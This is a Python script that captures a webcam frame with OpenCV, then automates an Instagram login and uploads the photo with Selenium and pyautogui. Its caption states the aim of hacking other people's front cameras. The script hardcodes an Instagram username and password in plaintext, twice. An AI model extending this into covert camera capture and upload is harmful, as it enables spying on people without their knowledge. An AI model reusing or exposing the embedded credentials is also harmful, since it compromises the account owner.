# from selenium import webdriver
# from webdriver_manager.chrome import ChromeDriverManager
# import time

# driver = webdriver.Chrome(ChromeDriverManager().install())

# driver.implicitly_wait(1)

# driver.get('https://www.instagram.com/')


# sleep(1)

# username_input = driver.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input')
# password_input = driver.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input')


# username_input.send_keys("sherazi74")

# password_input.send_keys("Sher@zi12")


# login_button = driver.find_element_by_xpath("//button[@type='submit']")

# login_button.click()

# sleep(9999999)

# driver.close()




#How to read Video from any folder using opencv

import cv2
import time
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
import pyautogui

#Capture video from webcam and save it

cap = cv2.VideoCapture(0,cv2.CAP_DSHOW)   #Here parameter 0 is a path of any video use for webcam
print("check===",cap.isOpened())

#it is 4 byte code which is use to specify the video codec
#Various codec --
#DIVX, XVID, MJPG, X264, WMV1, WMV2
fourcc = cv2.VideoWriter_fourcc(*"XVID")  # *"XVID"
#It contain 4 parameter , name, codec,fps,resolution
output = cv2.VideoWriter("output.mp4",fourcc,20.0,(640,480),0)

while(cap.isOpened()):
    ret, frame = cap.read()   #here read the frame
    # frame = cv2.flip(frame,0)
    if ret==True:
        
        gray  = cv2.cvtColor(frame,cv2.COLOR_BGR2GRAY)
        #here flip is used to lip the video at recording time
        frame = cv2.flip(frame,0)
        output.write(gray)
        
        cv2.imshow("Gray Frame",gray)
        cv2.imwrite('C:\\frames\\kang'+str(0)+'.jpg',gray)
        # cv2.imshow('Colorframe',frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):   #press to exit
            driver = webdriver.Chrome(ChromeDriverManager().install())
            driver.get("https://www.instagram.com/")
            time.sleep(5)
            my_email=driver.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input')
            my_email.send_keys("sherazi74")

            my_password=driver.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input')
            my_password.send_keys("Sher@zi12")
            time.sleep(10)

            login=driver.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]')
            login.click()
            time.sleep(5)
            upload=driver.find_element_by_xpath('//div[@class="QBdPU "]')
            upload.click()
            time.sleep(2)
            img_upload=driver.find_element_by_xpath('/html/body/div[8]/div[2]/div/div/div/div[2]/div[1]/div/div/div[2]').click()
            time.sleep(2)
            
            path = "C:\\frames\\kang0.jpg" # your imagepath
            pyautogui.write(path)
            time.sleep(2)
            pyautogui.press('enter')
            time.sleep(1)
            next = driver.find_element_by_xpath('/html/body/div[6]/div[2]/div/div/div/div[1]/div/div/div[3]/div/button')
            next.click()
            time.sleep(1)
            next2 = driver.find_element_by_xpath('/html/body/div[6]/div[2]/div/div/div/div[1]/div/div/div[3]/div/button')
            next2.click()
            time.sleep(1)
            caption5 = driver.find_element_by_xpath('/html/body/div[6]/div[2]/div/div/div/div[2]/div[2]/div/div/div/div[2]/div[1]/textarea')
            caption5.click()
            caption1 = "I'm trying to hack others front camera now i am testing its not video i think now its only take your photo..!"
            pyautogui.write(caption1)
            time.sleep(1)
            # done = driver.find_element_by_xpath('/html/body/div[6]/div[2]/div/div/div/div[1]/div/div/div[3]/div/button')
            # done.click()
            break
    else:
        break
 
# Release everything if job is finished
cap.release()
output.release()
cv2.destroyAllWindows()